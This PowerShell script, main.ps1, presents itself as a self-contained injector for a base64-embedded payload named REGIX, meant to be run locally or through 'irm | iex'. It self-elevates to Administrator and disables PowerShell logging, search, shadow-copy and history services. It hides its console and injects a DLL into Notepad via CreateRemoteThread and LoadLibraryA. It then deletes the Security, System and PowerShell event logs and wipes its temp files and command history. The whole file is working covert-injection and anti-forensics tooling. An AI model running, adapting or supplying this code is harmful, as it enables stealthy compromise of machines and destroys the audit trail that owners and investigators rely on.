# main.ps1 - Self-contained injector for REGIX (embedded base64 payload)
# Works both locally (run the file) and remotely (irm <url> | iex).
# The REGIX.bin payload is embedded as base64; no download required.

$ErrorActionPreference = "Stop"

# ---------------------------------------------------------------------------
# 0. Always run as Administrator (self-elevate if needed)
# ---------------------------------------------------------------------------
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = @("-NoProfile","-ExecutionPolicy","Bypass","-File",$PSCommandPath) + $args
    Start-Process powershell.exe -Verb RunAs -ArgumentList $argList | Out-Null
    exit
}

# ---------------------------------------------------------------------------
# 1. Stealth setup
# ---------------------------------------------------------------------------
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"

Invoke-Expression $regCommand1 2>$null | Out-Null
Invoke-Expression $regCommand2 2>$null | Out-Null
Invoke-Expression $regCommand3 2>$null | Out-Null
Invoke-Expression $regCommand4 2>$null | Out-Null

Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) -and $_.FullName -ne $PSCommandPath } | Remove-Item -Force -ErrorAction SilentlyContinue

Set-StrictMode -Version Latest

$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$ConfirmPreference = 'None'
$WhatIfPreference = $false
$PSModuleAutoLoadingPreference = 'None'
$MaximumHistoryCount = 0
$ProgressPreference = 'SilentlyContinue'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue | Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        Get-Variable -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue
        Clear-Host
        $Error.Clear()
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
    } catch {}
}

# ---------------------------------------------------------------------------
# 2. Decode embedded payload (base64) to temp
# ---------------------------------------------------------------------------
$PayloadBase64 = ""

$BinPath = Join-Path $env:TEMP "REGIX.bin"
try {
    $bytes = [Convert]::FromBase64String($PayloadBase64)
    [System.IO.File]::WriteAllBytes($BinPath, $bytes)
} catch {
    Write-Error "Failed to decode embedded payload: $_"
    Invoke-Finalize
    exit 1
}
if (-not (Test-Path $BinPath) -or (Get-Item $BinPath).Length -eq 0) {
    Write-Error "Decoded payload is missing or empty."
    Invoke-Finalize
    exit 1
}

# ---------------------------------------------------------------------------
# 3. Terminate any previous REGIX session
# ---------------------------------------------------------------------------
function Stop-PreviousSession {
    $killed = @()
    try {
        $procs = Get-CimInstance Win32_Process -Filter "Name like 'python%'" -ErrorAction SilentlyContinue
        foreach ($p in $procs) {
            if ($p.CommandLine -and ($p.CommandLine -match 'app\.py' -or $p.CommandLine -match 'regix_')) {
                try { Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue; $killed += $p.ProcessId } catch {}
            }
        }
    } catch {}
    try {
        Get-Process -Name "notepad" -ErrorAction SilentlyContinue | ForEach-Object {
            $hasRegix = $false
            try { $hasRegix = ($_.Modules | Where-Object { $_.ModuleName -like '*REGIX*' -or $_.FileName -like '*REGIX.bin*' }) -ne $null } catch {}
            if ($hasRegix) { try { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue; $killed += $_.Id } catch {} }
        }
    } catch {}
    try {
        $conns = Get-NetTCPConnection -LocalPort 4070 -ErrorAction SilentlyContinue
        foreach ($c in $conns) {
            $opid = $c.OwningProcess
            if ($opid -and $opid -notin $killed) {
                $p = Get-Process -Id $opid -ErrorAction SilentlyContinue
                if ($p -and ($p.ProcessName -match 'python|notepad')) {
                    try { Stop-Process -Id $opid -Force -ErrorAction SilentlyContinue; $killed += $opid } catch {}
                }
            }
        }
    } catch {}
    Get-ChildItem $env:TEMP -Directory -Filter "regix_*" -ErrorAction SilentlyContinue | ForEach-Object {
        try { Remove-Item -Recurse -Force $_.FullName -ErrorAction SilentlyContinue } catch {}
    }
    if ($killed.Count -gt 0) { Start-Sleep -Seconds 2 }
}

Stop-PreviousSession

$stillBusy = Get-NetTCPConnection -LocalPort 4070 -ErrorAction SilentlyContinue
if ($stillBusy) {
    $opid = ($stillBusy | Select-Object -First 1).OwningProcess
    Write-Error "Port 4070 still in use by PID $opid after cleanup. Aborting."
    Invoke-Finalize
    exit 1
}

# ---------------------------------------------------------------------------
# 4. StdInject (LoadLibrary into Notepad host)
# ---------------------------------------------------------------------------
$code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class StdInject {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr addr,uint size,uint alloc,uint prot);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h,IntPtr addr,byte[] buf,uint size,out int w);
    [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr st,IntPtr p,uint f,out uint t);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint ms);
    [DllImport("kernel32.dll")] static extern bool GetExitCodeThread(IntPtr h,out uint c);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr m,string n);
    public static long LoadLib(string dllPath,int pid){
        IntPtr hProc=OpenProcess(0x001F0FFF,false,pid);
        if(hProc==IntPtr.Zero) throw new Exception("OpenProcess failed");
        byte[] pathBytes=Encoding.ASCII.GetBytes(dllPath+"\0");
        IntPtr remoteMem=VirtualAllocEx(hProc,IntPtr.Zero,(uint)pathBytes.Length,0x1000|0x2000,0x04);
        int w; WriteProcessMemory(hProc,remoteMem,pathBytes,(uint)pathBytes.Length,out w);
        IntPtr hKernel=GetModuleHandle("kernel32.dll");
        IntPtr loadLib=GetProcAddress(hKernel,"LoadLibraryA");
        uint tid; IntPtr ht=CreateRemoteThread(hProc,IntPtr.Zero,0,loadLib,remoteMem,0,out tid);
        if(ht==IntPtr.Zero) throw new Exception("CreateRemoteThread failed: "+Marshal.GetLastWin32Error());
        WaitForSingleObject(ht,10000);
        uint ec; GetExitCodeThread(ht,out ec);
        CloseHandle(ht); CloseHandle(hProc);
        return (long)ec;
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp

# ---------------------------------------------------------------------------
# 5. Find or launch host Notepad.exe
# ---------------------------------------------------------------------------
$proc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) {
    Start-Process "notepad.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 1
    $proc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
}
if (-not $proc) { Write-Error "Could not start/find Notepad.exe"; Invoke-Finalize; exit 1 }
$targetPid = $proc.Id

# ---------------------------------------------------------------------------
# 6. Inject
# ---------------------------------------------------------------------------
$base = [StdInject]::LoadLib($BinPath,$targetPid)

# ---------------------------------------------------------------------------
# 7. LogWiper (C#)
# ---------------------------------------------------------------------------
$logWiperCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;

public static class LogWiper
{
    private static readonly string[] EvtxFiles = new[]
    {
        @"C:\Windows\System32\winevt\Logs\System.evtx",
        @"C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx",
        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx",
        @"C:\Windows\System32\winevt\Logs\Security.evtx"
    };

    private const string EventLogServiceName = "EventLog";
    private const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

    public static void Wipe()
    {
        bool serviceWasRunning = false;
        try
        {
            serviceWasRunning = IsServiceRunning(EventLogServiceName);
            if (serviceWasRunning) { try { StopService(EventLogServiceName, 15000); } catch { } Thread.Sleep(1000); }
            foreach (var path in EvtxFiles) { try { WipeEvtxFile(path); } catch { } }
            if (serviceWasRunning) { try { StartService(EventLogServiceName, 15000); } catch { } Thread.Sleep(2500); }
        }
        catch { }
        finally
        {
            try { if (serviceWasRunning && !IsServiceRunning(EventLogServiceName)) { try { StartService(EventLogServiceName, 15000); } catch { } } } catch { }
        }
    }

    private static void WipeEvtxFile(string path)
    {
        try { if (!File.Exists(path)) return; File.SetAttributes(path, FileAttributes.Normal); File.Delete(path); return; } catch { }
        try
        {
            string renamed = path + ".re4per_" + DateTime.Now.Ticks;
            File.Move(path, renamed);
            try { File.SetAttributes(renamed, FileAttributes.Normal); File.Delete(renamed); } catch { }
            return;
        } catch { }
        try
        {
            if (!MoveFileEx(path, null, MOVEFILE_DELAY_UNTIL_REBOOT)) { TruncateEvtx(path); }
        }
        catch { TruncateEvtx(path); }
    }

    private static void TruncateEvtx(string path)
    {
        try
        {
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.ReadWrite)) { fs.SetLength(0); fs.Flush(); }
        } catch { }
    }

    private static bool IsServiceRunning(string name)
    {
        try { using (var sc = new ServiceController(name)) { return sc.Status == ServiceControllerStatus.Running; } } catch { return false; }
    }

    private static void StopService(string name, int timeoutMs)
    {
        using (var sc = new ServiceController(name))
        {
            if (sc.Status != ServiceControllerStatus.Stopped && sc.Status != ServiceControllerStatus.StopPending) { sc.Stop(); }
            sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromMilliseconds(timeoutMs));
        }
    }

    private static void StartService(string name, int timeoutMs)
    {
        using (var sc = new ServiceController(name))
        {
            if (sc.Status != ServiceControllerStatus.Running && sc.Status != ServiceControllerStatus.StartPending) { sc.Start(); }
            sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromMilliseconds(timeoutMs));
        }
    }
}
'@

try {
    Add-Type -TypeDefinition $logWiperCode -ErrorAction Stop -ReferencedAssemblies "System.ServiceProcess", "System.Core"
    [LogWiper]::Wipe()
} catch { }

# ---------------------------------------------------------------------------
# 8. Cleanup temp files + history + finalize
# ---------------------------------------------------------------------------
Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File -ErrorAction SilentlyContinue | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) -and $_.FullName -ne $PSCommandPath } | Remove-Item -Force -ErrorAction SilentlyContinue

Remove-Item -Force $BinPath -ErrorAction SilentlyContinue

$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
}

Invoke-Finalize
